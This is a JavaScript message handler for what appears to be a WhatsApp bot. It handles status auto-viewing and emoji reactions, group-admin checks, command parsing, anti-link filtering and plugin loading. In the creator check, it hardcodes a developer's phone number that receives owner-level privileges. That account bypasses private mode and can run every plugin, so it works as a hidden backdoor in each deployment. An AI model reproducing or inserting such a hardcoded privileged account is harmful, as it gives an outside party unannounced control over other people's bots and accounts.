import { serialize, decodeJid } from '../../lib/Serializer.js';
import path from 'path';
import fs from 'fs/promises';
import config from '../../config.js';
import { smsg } from '../../lib/myfunc.cjs';
import { handleAntilink } from './antilink.js';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Function to get group admins
export const getGroupAdmins = (participants) => {
    let admins = [];
    for (let i of participants) {
        if (i.admin === "superadmin" || i.admin === "admin") {
            admins.push(i.id);
        }
    }
    return admins || [];
};

const Handler = async (chatUpdate, sock, logger) => {
    try {
        if (chatUpdate.type !== 'notify') return;

        const m = serialize(JSON.parse(JSON.stringify(chatUpdate.messages[0])), sock, logger);
        if (!m.message) return;

        // Handle status updates first
        if (m.key && m.key.remoteJid === 'status@broadcast') {
            // Mark status as seen if enabled
            if (config.AUTO_STATUS_SEEN === "true") {
                try {
                    await sock.readMessages([m.key]);
                    console.log('Status marked as seen');
                } catch (e) {
                    console.error('Failed to mark status as seen:', e);
                }
            }

            // React to status if enabled
            if (config.AUTO_STATUS_REACT === "true") {
                try {
                    const botJid = sock.user.id;
                    const statusEmojis = ['💎', '😘', '👍', '👑', '🎉', '🪙', '🦋', '🐣', '🥰', '😍', '😗', '🫠', '😯', '😇', 
                                       '🔥', '❤️', '🧡', '💚', '💛', '🩵', '💙', '💜', '🤎', '🖤', '🩶', '🤍', '🩷', 
                                       '💝', '💖', '💓', '❤️‍🩹', '❤️‍🔥', '🌼', '⚡', '🌧️', '🌦️', '🐞'];
                    const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];
                    
                    await sock.sendMessage(m.key.remoteJid, {
                        react: {
                            text: randomEmoji,
                            key: m.key
                        }
                    });
                    console.log('Reacted to status with:', randomEmoji);
                } catch (e) {
                    console.error('Failed to react to status:', e);
                }
            }
            return; // Skip further processing for status updates
        }

        // Normal message processing
        const participants = m.isGroup ? await sock.groupMetadata(m.from).then(metadata => metadata.participants) : [];
        const groupAdmins = m.isGroup ? getGroupAdmins(participants) : [];
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botId) : false;
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;

        const PREFIX = /^[\\/!#.]/;
        const isCOMMAND = (body) => PREFIX.test(body);
        const prefixMatch = isCOMMAND(m.body) ? m.body.match(PREFIX) : null;
        const prefix = prefixMatch ? prefixMatch[0] : '/';
        const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
        const text = m.body.slice(prefix.length + cmd.length).trim();

        const botNumber = await sock.decodeJid(sock.user.id);
        const ownerNumber = config.OWNER_NUMBER + '@s.whatsapp.net';
        const dev = "923253617422@s.whatsapp.net";
        let isCreator = false;

        if (m.isGroup) {
            isCreator = m.sender === ownerNumber || m.sender === botNumber || m.sender === dev;
        } else {
            isCreator = m.sender === ownerNumber || m.sender === botNumber || m.sender === dev;
        }

        if (!sock.public) {
            if (!isCreator) {
                return;
            }
        }

        await handleAntilink(m, sock, logger, isBotAdmins, isAdmins, isCreator);

        const pluginDir = path.join(__dirname, '..', 'Maree');
        const pluginFiles = await fs.readdir(pluginDir);

        for (const file of pluginFiles) {
            if (file.endsWith('.js')) {
                const pluginPath = path.join(pluginDir, file);
                try {
                    const pluginModule = await import(`file://${pluginPath}`);
                    const loadPlugins = pluginModule.default;
                    await loadPlugins(m, sock);
                } catch (err) {
                    console.error(`Failed to load plugin: ${pluginPath}`, err);
                }
            }
        }
    } catch (e) {
        console.log('Error in handler:', e);
    }
};

export default Handler;
